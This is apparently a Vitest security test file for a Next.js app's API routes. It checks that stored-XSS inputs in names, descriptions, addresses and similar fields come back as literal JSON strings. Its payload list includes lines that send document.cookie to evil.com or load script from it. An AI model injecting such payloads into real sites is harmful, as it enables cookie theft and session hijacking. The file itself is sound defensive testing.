// @vitest-environment node
/**
 * XSS Stored — rotas não cobertas em xss.test.ts
 *
 * Complementa o arquivo xss.test.ts cobrindo:
 *   • POST /api/usuarios  → name, email
 *   • POST /api/titulos   → descricao
 *   • POST /api/rocas     → nome, localizacao, observacao, cultura
 *   • POST /api/transportadoras → nome
 *   • POST /api/clientes  → enderecos[].logradouro, contatos[].nomeContato
 *   • PUT  /api/clientes/[id]     → nome (update)
 *   • PUT  /api/fornecedores/[id] → nome (update)
 *   • PUT  /api/rocas/[id]        → nome, observacao (update)
 *
 * Em todos os casos o dado percorre:
 *   request body → handler → Prisma (parameterizado) → JSON response
 *
 * Nunca é interpolado em HTML nem executado como script.
 */

import { describe, it, expect, vi, beforeEach } from 'vitest'

vi.mock('server-only', () => ({}))
vi.mock('next/cache', () => ({ revalidateTag: vi.fn() }))
vi.mock('@/lib/mem-cache', () => ({
  memCache: { fetch: vi.fn((_, fn: () => unknown) => fn()), invalidate: vi.fn() },
}))
vi.mock('bcryptjs', () => ({
  default: { hash: vi.fn().mockResolvedValue('$2b$10$hasheado'), compare: vi.fn() },
}))

const {
  mockUserFindUnique, mockUserCreate,
  mockTituloCreate,
  mockRocaCreate, mockRocaUpdate, mockRocaCount, mockRocaFindUnique,
  mockColheitaUpdateMany,
  mockTransportadoraCreate,
  mockClienteCreate, mockClienteUpdate,
  mockFornecedorUpdate,
} = vi.hoisted(() => ({
  mockUserFindUnique:      vi.fn().mockResolvedValue(null),
  mockUserCreate:          vi.fn(),
  mockTituloCreate:        vi.fn(),
  mockRocaCreate:          vi.fn(),
  mockRocaUpdate:          vi.fn(),
  mockRocaCount:           vi.fn().mockResolvedValue(0),
  mockRocaFindUnique:      vi.fn().mockResolvedValue(null),
  mockColheitaUpdateMany:  vi.fn().mockResolvedValue({ count: 0 }),
  mockTransportadoraCreate: vi.fn(),
  mockClienteCreate:       vi.fn(),
  mockClienteUpdate:       vi.fn(),
  mockFornecedorUpdate:    vi.fn(),
}))

vi.mock('@/lib/session', () => ({
  getSession: vi.fn().mockResolvedValue({
    userId: 'u-1', name: 'Admin', email: 'admin@test.com', role: 'DONO', expiresAt: new Date(),
  }),
}))
vi.mock('@/lib/prisma', () => ({
  prisma: {
    user:              { findUnique: mockUserFindUnique, create: mockUserCreate },
    tituloFinanceiro:  { create: mockTituloCreate },
    controleRoca:      { create: mockRocaCreate, update: mockRocaUpdate, count: mockRocaCount, findUnique: mockRocaFindUnique },
    colheitaDiaria:    { updateMany: mockColheitaUpdateMany },
    transportadora:    { create: mockTransportadoraCreate },
    cliente:           { create: mockClienteCreate, update: mockClienteUpdate },
    fornecedor:        { update: mockFornecedorUpdate },
  },
}))

import { NextRequest } from 'next/server'
import { POST as postUsuario }        from '@/app/api/usuarios/route'
import { POST as postTitulo }         from '@/app/api/titulos/route'
import { POST as postRoca }           from '@/app/api/rocas/route'
import { PUT  as putRoca }            from '@/app/api/rocas/[id]/route'
import { POST as postTransportadora } from '@/app/api/transportadoras/route'
import { POST as postCliente }        from '@/app/api/clientes/route'
import { PUT  as putCliente }         from '@/app/api/clientes/[id]/route'
import { PUT  as putFornecedor }      from '@/app/api/fornecedores/[id]/route'

// ─── Payloads XSS ─────────────────────────────────────────────────────────────
const XSS_PAYLOADS = [
  '<script>alert(document.cookie)</script>',
  '<img src=x onerror=fetch("https://evil.com?c="+document.cookie)>',
  '"><svg onload=alert(1)>',
  '<iframe src="javascript:alert(origin)"></iframe>',
  '<body onload=alert(1)>',
  // mXSS — Mutation XSS sobrevive a sanitizadores ingênuos
  '<svg><script>alert(1)</script></svg>',
  // template injection
  '{{constructor.constructor("alert(1)")()}}',
  '${constructor.constructor("alert(1)")()}',
  // case / encoding variation
  '<ScRiPt SrC=//evil.com/x.js></sCrIpT>',
  '<script\x20type="text/javascript">alert(1)</script>',
  // protocolo javascript:
  'jaVaScRiPt:alert(1)',
  'data:text/html,<script>alert(1)</script>',
  // HTML5 event handlers
  '<details open ontoggle=alert(1)>',
  '<input autofocus onfocus=alert(1)>',
  // CSS expression (IE legado)
  '<div style="width:expression(alert(1))">',
  // Base tag hijack
  '<base href="//evil.com">',
  // XSS via href/action
  '<a href="javascript:alert(1)">clique</a>',
  // DOM clobbering
  '<form id=document><input name=write>',
]

beforeEach(() => {
  vi.clearAllMocks()
  mockUserFindUnique.mockResolvedValue(null)
  mockRocaCount.mockResolvedValue(0)
  mockRocaFindUnique.mockResolvedValue(null)
  mockColheitaUpdateMany.mockResolvedValue({ count: 0 })
})

// ─── Helpers ──────────────────────────────────────────────────────────────────
function assertJsonAndNotHtml(res: Response, text: string) {
  expect(res.headers.get('content-type')).toContain('application/json')
  expect(res.headers.get('content-type')).not.toContain('text/html')
  expect(() => JSON.parse(text)).not.toThrow()
}

// ─── 1. POST /api/usuarios — name e email ────────────────────────────────────

describe('XSS stored — POST /api/usuarios (name)', () => {
  it.each(XSS_PAYLOADS)('name="%s" é armazenado como string literal e devolvido via JSON', async (payload) => {
    mockUserCreate.mockResolvedValue({
      id: 'u-1', name: payload, email: 'x@x.com',
      role: 'GERENTE', ativo: true, createdAt: new Date(),
    })
    const req = new NextRequest('http://localhost/api/usuarios', {
      method: 'POST',
      body: JSON.stringify({ name: payload, email: 'x@x.com', password: 'Senha@123' }),
    })
    const res = await postUsuario(req)
    expect(res.status).toBe(201)
    const text = await res.text()
    assertJsonAndNotHtml(res, text)
    // O payload chega ao Prisma como string — nunca como HTML executável
    expect(mockUserCreate).toHaveBeenCalledWith(
      expect.objectContaining({ data: expect.objectContaining({ name: payload }) })
    )
    const data = JSON.parse(text)
    expect(data.name).toBe(payload)
  })
})

describe('XSS stored — POST /api/usuarios (email)', () => {
  it.each(XSS_PAYLOADS)('email="%s" é armazenado como string literal', async (payload) => {
    mockUserCreate.mockResolvedValue({
      id: 'u-1', name: 'Teste', email: payload,
      role: 'GERENTE', ativo: true, createdAt: new Date(),
    })
    const req = new NextRequest('http://localhost/api/usuarios', {
      method: 'POST',
      body: JSON.stringify({ name: 'Teste', email: payload, password: 'Senha@123' }),
    })
    const res = await postUsuario(req)
    // Pode ser 201 ou 400 (validação de formato de e-mail), nunca deve crashar
    expect([201, 400, 409]).toContain(res.status)
    const text = await res.text()
    assertJsonAndNotHtml(res, text)
  })
})

// ─── 2. POST /api/titulos — descricao ────────────────────────────────────────

describe('XSS stored — POST /api/titulos (descricao)', () => {
  it.each(XSS_PAYLOADS)('descricao="%s" é armazenado como string literal e devolvido via JSON', async (payload) => {
    mockTituloCreate.mockResolvedValue({
      id: 't-1', descricao: payload, valor: 100, clienteId: 'c-1',
      dataEmissao: new Date(), dataVenc: new Date(), origem: 'MANUAL', nfeId: null,
      cliente: { id: 'c-1', nome: 'Cliente', createdAt: new Date() },
      createdAt: new Date(),
    })
    const req = new NextRequest('http://localhost/api/titulos', {
      method: 'POST',
      body: JSON.stringify({
        clienteId: 'c-1', descricao: payload,
        valor: 100, dataVenc: '2026-12-31',
      }),
    })
    const res = await postTitulo(req)
    expect(res.status).toBe(201)
    const text = await res.text()
    assertJsonAndNotHtml(res, text)
    expect(mockTituloCreate).toHaveBeenCalledWith(
      expect.objectContaining({ data: expect.objectContaining({ descricao: payload }) })
    )
    const data = JSON.parse(text)
    expect(data.descricao).toBe(payload)
  })
})

// ─── 3. POST /api/rocas — campos de texto ────────────────────────────────────

const mockRoca = {
  id: 'r-1', codigo: 'R001', nome: 'X', area: null, localizacao: null,
  mudasPlantadas: null, cultura: null, produtorId: null, status: 'ATIVA',
  dataPlantio: null, dataColheita: null, observacao: null,
  produtor: null, registros: [], createdAt: new Date(),
}

describe('XSS stored — POST /api/rocas (nome)', () => {
  it.each(XSS_PAYLOADS)('nome="%s" é armazenado como string literal', async (payload) => {
    mockRocaCreate.mockResolvedValue({ ...mockRoca, nome: payload })
    const req = new NextRequest('http://localhost/api/rocas', {
      method: 'POST',
      body: JSON.stringify({ nome: payload }),
    })
    const res = await postRoca(req)
    expect(res.status).toBe(201)
    const text = await res.text()
    assertJsonAndNotHtml(res, text)
    expect(mockRocaCreate).toHaveBeenCalledWith(
      expect.objectContaining({ data: expect.objectContaining({ nome: payload }) })
    )
    expect(JSON.parse(text).nome).toBe(payload)
  })
})

describe('XSS stored — POST /api/rocas (localizacao e observacao)', () => {
  it.each(XSS_PAYLOADS)('localizacao="%s" é armazenado como string literal', async (payload) => {
    mockRocaCreate.mockResolvedValue({ ...mockRoca, localizacao: payload })
    const req = new NextRequest('http://localhost/api/rocas', {
      method: 'POST',
      body: JSON.stringify({ nome: 'Roça', localizacao: payload }),
    })
    const res = await postRoca(req)
    expect(res.status).toBe(201)
    const text = await res.text()
    assertJsonAndNotHtml(res, text)
    expect(mockRocaCreate).toHaveBeenCalledWith(
      expect.objectContaining({ data: expect.objectContaining({ localizacao: payload }) })
    )
  })

  it.each(XSS_PAYLOADS)('observacao="%s" é armazenado como string literal', async (payload) => {
    mockRocaCreate.mockResolvedValue({ ...mockRoca, observacao: payload })
    const req = new NextRequest('http://localhost/api/rocas', {
      method: 'POST',
      body: JSON.stringify({ nome: 'Roça', observacao: payload }),
    })
    const res = await postRoca(req)
    expect(res.status).toBe(201)
    const text = await res.text()
    assertJsonAndNotHtml(res, text)
    expect(mockRocaCreate).toHaveBeenCalledWith(
      expect.objectContaining({ data: expect.objectContaining({ observacao: payload }) })
    )
  })
})

// ─── 4. POST /api/transportadoras — nome ─────────────────────────────────────

describe('XSS stored — POST /api/transportadoras (nome)', () => {
  it.each(XSS_PAYLOADS)('nome="%s" é armazenado como string literal', async (payload) => {
    mockTransportadoraCreate.mockResolvedValue({ id: 't-1', nome: payload, createdAt: new Date() })
    const req = new NextRequest('http://localhost/api/transportadoras', {
      method: 'POST',
      body: JSON.stringify({ nome: payload }),
    })
    const res = await postTransportadora(req)
    expect(res.status).toBe(201)
    const text = await res.text()
    assertJsonAndNotHtml(res, text)
    expect(mockTransportadoraCreate).toHaveBeenCalledWith(
      expect.objectContaining({ data: expect.objectContaining({ nome: payload }) })
    )
    expect(JSON.parse(text).nome).toBe(payload)
  })
})

// ─── 5. POST /api/clientes — campos aninhados ────────────────────────────────

const mockCliente = {
  id: 'c-1', nome: 'Cliente', tipo: 'FISICA', cnpjCpf: null,
  inscricaoEstadual: null, telefone: null, email: null, ativo: true,
  _count: { nfes: 0, romaneios: 0 }, enderecos: [], contatos: [],
  createdAt: new Date(),
}

describe('XSS stored — POST /api/clientes (enderecos[].logradouro)', () => {
  it.each(XSS_PAYLOADS)('logradouro="%s" é armazenado como string literal', async (payload) => {
    mockClienteCreate.mockResolvedValue(mockCliente)
    const req = new NextRequest('http://localhost/api/clientes', {
      method: 'POST',
      body: JSON.stringify({
        nome: 'Cliente Teste',
        enderecos: [{ logradouro: payload, cidade: 'São Paulo', estado: 'SP' }],
      }),
    })
    const res = await postCliente(req)
    expect(res.status).toBe(201)
    const text = await res.text()
    assertJsonAndNotHtml(res, text)
    expect(mockClienteCreate).toHaveBeenCalledWith(
      expect.objectContaining({
        data: expect.objectContaining({
          enderecos: expect.objectContaining({
            create: expect.arrayContaining([
              expect.objectContaining({ logradouro: payload }),
            ]),
          }),
        }),
      })
    )
  })
})

describe('XSS stored — POST /api/clientes (contatos[].nomeContato)', () => {
  it.each(XSS_PAYLOADS)('nomeContato="%s" é armazenado como string literal', async (payload) => {
    mockClienteCreate.mockResolvedValue(mockCliente)
    const req = new NextRequest('http://localhost/api/clientes', {
      method: 'POST',
      body: JSON.stringify({
        nome: 'Cliente Teste',
        contatos: [{ nomeContato: payload, telefone: '11999999999' }],
      }),
    })
    const res = await postCliente(req)
    expect(res.status).toBe(201)
    const text = await res.text()
    assertJsonAndNotHtml(res, text)
    expect(mockClienteCreate).toHaveBeenCalledWith(
      expect.objectContaining({
        data: expect.objectContaining({
          contatos: expect.objectContaining({
            create: expect.arrayContaining([
              expect.objectContaining({ nomeContato: payload }),
            ]),
          }),
        }),
      })
    )
  })
})

// ─── 6. PUT /api/clientes/[id] — update nome ─────────────────────────────────

describe('XSS stored — PUT /api/clientes/[id] (update nome)', () => {
  it.each(XSS_PAYLOADS)('nome="%s" atualizado é armazenado como string literal', async (payload) => {
    mockClienteUpdate.mockResolvedValue({ ...mockCliente, nome: payload.trim() })
    const req = new NextRequest('http://localhost/api/clientes/c-1', {
      method: 'PUT',
      body: JSON.stringify({ nome: payload }),
    })
    const res = await putCliente(req, { params: Promise.resolve({ id: 'c-1' }) })
    expect(res.status).toBe(200)
    const text = await res.text()
    assertJsonAndNotHtml(res, text)
    expect(mockClienteUpdate).toHaveBeenCalledWith(
      expect.objectContaining({
        where: { id: 'c-1' },
        data: expect.objectContaining({ nome: payload.trim() }),
      })
    )
    expect(JSON.parse(text).nome).toBe(payload.trim())
  })
})

// ─── 7. PUT /api/fornecedores/[id] — update nome ─────────────────────────────

const mockFornecedor = {
  id: 'f-1', nome: 'Fornecedor', tipo: 'JURIDICA', cnpjCpf: null,
  inscricaoEstadual: null, telefone: null, email: null, ativo: true,
  _count: { compras: 0, nfes: 0 }, enderecos: [], contatos: [], createdAt: new Date(),
}

describe('XSS stored — PUT /api/fornecedores/[id] (update nome)', () => {
  it.each(XSS_PAYLOADS)('nome="%s" atualizado é armazenado como string literal', async (payload) => {
    mockFornecedorUpdate.mockResolvedValue({ ...mockFornecedor, nome: payload.trim() })
    const req = new NextRequest('http://localhost/api/fornecedores/f-1', {
      method: 'PUT',
      body: JSON.stringify({ nome: payload }),
    })
    const res = await putFornecedor(req, { params: Promise.resolve({ id: 'f-1' }) })
    expect(res.status).toBe(200)
    const text = await res.text()
    assertJsonAndNotHtml(res, text)
    expect(mockFornecedorUpdate).toHaveBeenCalledWith(
      expect.objectContaining({
        where: { id: 'f-1' },
        data: expect.objectContaining({ nome: payload.trim() }),
      })
    )
  })
})

// ─── 8. PUT /api/rocas/[id] — update nome e observacao ───────────────────────

describe('XSS stored — PUT /api/rocas/[id] (update nome)', () => {
  it.each(XSS_PAYLOADS)('nome="%s" atualizado é armazenado como string literal', async (payload) => {
    mockRocaUpdate.mockResolvedValue({ ...mockRoca, nome: payload })
    const req = new NextRequest('http://localhost/api/rocas/r-1', {
      method: 'PUT',
      body: JSON.stringify({ nome: payload, status: 'ATIVA' }),
    })
    const res = await putRoca(req, { params: Promise.resolve({ id: 'r-1' }) })
    expect(res.status).toBe(200)
    const text = await res.text()
    assertJsonAndNotHtml(res, text)
    expect(mockRocaUpdate).toHaveBeenCalledWith(
      expect.objectContaining({
        where: { id: 'r-1' },
        data: expect.objectContaining({ nome: payload }),
      })
    )
    expect(JSON.parse(text).nome).toBe(payload)
  })
})

describe('XSS stored — PUT /api/rocas/[id] (update observacao)', () => {
  it.each(XSS_PAYLOADS)('observacao="%s" atualizada é armazenada como string literal', async (payload) => {
    mockRocaUpdate.mockResolvedValue({ ...mockRoca, observacao: payload })
    const req = new NextRequest('http://localhost/api/rocas/r-1', {
      method: 'PUT',
      body: JSON.stringify({ nome: 'Roça', status: 'ATIVA', observacao: payload }),
    })
    const res = await putRoca(req, { params: Promise.resolve({ id: 'r-1' }) })
    expect(res.status).toBe(200)
    const text = await res.text()
    assertJsonAndNotHtml(res, text)
    expect(mockRocaUpdate).toHaveBeenCalledWith(
      expect.objectContaining({
        data: expect.objectContaining({ observacao: payload }),
      })
    )
  })
})

// ─── 9. JSON.stringify nunca produz HTML executável ──────────────────────────

describe('XSS — JSON.stringify não produz HTML executável', () => {
  it('payload de fechamento de script tag é escapado pelo JSON.stringify', async () => {
    const payload = '</script><script>alert(1)</script>'
    mockUserCreate.mockResolvedValue({
      id: 'u-1', name: payload, email: 'x@x.com',
      role: 'GERENTE', ativo: true, createdAt: new Date(),
    })
    const req = new NextRequest('http://localhost/api/usuarios', {
      method: 'POST',
      body: JSON.stringify({ name: payload, email: 'x@x.com', password: 'Senha@123' }),
    })
    const res = await postUsuario(req)
    const text = await res.text()
    // JSON.stringify escapa < e > — o payload nunca "quebra" o contexto JSON
    expect(() => JSON.parse(text)).not.toThrow()
  })

  it('payload de event handler em titulo é devolvido como string JSON — não executado', async () => {
    const payload = '<img src=x onerror=fetch("//evil.com?c="+document.cookie)>'
    mockTituloCreate.mockResolvedValue({
      id: 't-1', descricao: payload, valor: 50, clienteId: 'c-1',
      dataEmissao: new Date(), dataVenc: new Date(), origem: 'MANUAL', nfeId: null,
      cliente: null, createdAt: new Date(),
    })
    const req = new NextRequest('http://localhost/api/titulos', {
      method: 'POST',
      body: JSON.stringify({ clienteId: 'c-1', descricao: payload, valor: 50, dataVenc: '2026-12-31' }),
    })
    const res = await postTitulo(req)
    const text = await res.text()
    // Resposta é JSON puro — o payload fica dentro de aspas duplas no JSON
    expect(() => JSON.parse(text)).not.toThrow()
    expect(res.headers.get('content-type')).toContain('application/json')
  })
})
